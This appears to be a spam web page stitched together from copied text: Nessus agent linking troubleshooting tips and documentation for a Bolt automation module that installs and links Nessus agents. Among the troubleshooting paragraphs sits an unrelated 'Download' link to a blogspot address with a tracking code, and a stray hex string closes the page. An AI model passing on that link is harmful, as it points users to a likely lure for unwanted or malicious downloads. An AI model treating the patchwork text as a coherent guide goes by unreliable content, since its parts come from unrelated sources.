If you suspect that you ran the linking command from the wrong directory, then you'll need to run it again. This time, make sure that you're****either**in the folder**where nessuscli is installed, or **add the path** to the command.
 
**The agent hasn't installed**  
It is possible that your original install command contained errors (wrong filename, wrong path, name / NESSUS\_NAME etc) so we would recommend going back and trying the installation process again.
 
**Download ✯ [https://climmulponorc.blogspot.com/?c=2A0SVg](https://climmulponorc.blogspot.com/?c=2A0SVg)**


 
**Your system cannot reach out to tenable**  
You need to check that you are connected to the internet and that the agent can reach out to cloud.tenable.com on port 443. (This is the only relevant firewall rule). When you are certain that the system is connected to the internet, try running the command again. If it still says "not linked to a manager" then you will need to try the installation process again.
 
**An internet proxy/filter is getting in the way**  
The agent cannot connect to the manager, this could be due to internal network controls such as an outbound proxy. If your environment has these types of controls, please refer to documentation here, and use the proxy parameters on install to ensure the agent connects to the manager via the proxy.
 
If you've never used bolt before, the easiest way to get started is with a bolt project. Bolt projects allow you to keep/organise your bolt automation in a single space. I've created a skeleton of a bolt project here: \_sandbox.
 
Ps. There's some learning/sample tasks and a plan included in the bolt\_sandbox that'll help you get started with building your own tasks and plans. You can start by creating tasks and plans in their relevant directories within the bolt\_sandbox!
 
Depending on your targets user level permissions, you may have to pass --run-as=root and --sudo-password='mysudopassword' or --sudo-password-prompt flags on your bolt command. You can also add run-as: root and sudo-password: 'mysudopassword' to your config in your inventory.yaml file to enable you to keep your bolt command shorter/neater.

Tasks are cross platform so you only need to specify your targets and the task will work out what needs to be done per supported OS across \*nix & windows. Whilst they are cross platform tasks, you can only run the nessus\_agent::link, nessus\_agent::unlink & nessus\_agent::generatelogs tasks on a mix of targets comprising of disparate oses at the same time.
 
If you're using tenable.io then at the very minimum, you'll only need to pass your linking key and your Nessus agents will pair with your tenable instance however they're a bunch of optional parameters you can take advantage of such agent name, groups, offline install and more.
 
All of the parameters found in nessus\_agent::install and nessus\_agent::link tasks are supported in this "complete workflow" plan. This plan will allow you to specify a Nessus agent install package locally on your bolt workstation for upload to your remote targets. Once uploaded, it will then install the Nessus agent using the package provided and link the Tenable agent to tenable.io or Nessus Manager, depending on the flags passed.
 
You can set upload=false to skip the upload step and only **install** and **link** agents if you've already uploaded the Nessus agent installer to the target node(s) via alternate methods.
 
When a Nessus agent log tarball is generated on linux, it has root ownership as default. This means that bolt can't download logs directly using SCP. To get around this, the nessus\_agent::generatelogs plan changes the ownership of these logs to a user you specify via the user parameter which enables bolt to download them to your workstation. Once logs are downloaded, they are deleted from the target node.
 a2f82b0cb4
 
